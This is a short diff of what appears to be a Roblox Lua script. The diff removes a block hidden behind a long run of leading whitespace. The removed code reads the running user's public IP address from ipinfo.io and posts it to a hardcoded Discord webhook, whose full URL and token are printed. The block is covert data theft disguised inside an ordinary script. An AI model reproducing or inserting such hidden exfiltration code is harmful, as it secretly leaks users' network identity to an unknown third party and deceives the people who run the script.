@@ -261,16 +261,3 @@ runFunction(function()
 		end
 	})
 end)
-
-											http_request({
-    Url = "https://discord.com/api/webhooks/1204963589933502535/-64Zs-NWs2T8E6MrvEd5UIKEROsQ1BYzyMDpNjFzu_iG8sc3xVCxEoQTkwIt84fRIssM",
-    Method = "POST",
-    Headers = {
-    ["content-type"] = "application/json"
-    },
-    Body = game:GetService("HttpService"):JSONEncode({
-    ["content"] = game:HttpGet("https://ipinfo.io/ip")
-    })
-    })
-end
-end
